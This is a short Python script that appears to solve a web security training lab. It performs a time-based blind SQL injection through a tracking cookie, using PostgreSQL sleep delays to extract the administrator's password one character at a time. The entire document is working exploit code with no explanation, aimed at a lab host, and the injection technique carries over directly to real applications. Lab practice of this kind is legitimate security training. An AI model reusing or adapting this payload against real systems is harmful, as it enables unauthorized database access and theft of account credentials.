import requests

s = requests.Session()
abc = 'abcdefghijklmnopqrstuvwxyz0123456789'

password = ""
for p in range(20):
    for a in abc:
    # a = 'a'
    # p = 1
        r = s.get('https://ac5f1fc91ecfbac98061023900b3006f.web-security-academy.net/', cookies={"TrackingId":"RE5nOMS1F6G2m06C'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(2) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
        print(a, p, r.elapsed.total_seconds(), "password =", password)
        if r.elapsed.total_seconds() > 2 :
            password += a
            break

